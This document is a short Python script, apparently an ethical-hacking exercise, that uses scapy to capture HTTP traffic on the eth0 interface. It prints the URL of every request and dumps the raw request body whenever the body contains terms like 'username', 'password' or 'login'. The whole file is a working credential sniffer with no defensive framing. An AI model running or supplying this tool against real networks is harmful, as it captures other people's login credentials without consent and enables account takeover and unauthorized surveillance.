#!/usr/bin/env python3
import scapy.all as scapy # type: ignore
from scapy.layers import http # type: ignore

def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        return url

def get_login_info(packet):
        if  packet.haslayer(http.Raw):
                load = packet[scapy.Raw].load.decode()
                keywords = ["username","uname","user","password","pass","login"]
                for keyword in keywords:
                        if keyword in load:
                                return load

def process_sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
                url = get_url(packet)
                print(str(url))
                login_info = get_login_info(packet)
                if login_info:
                        print(login_info)
sniff("eth0")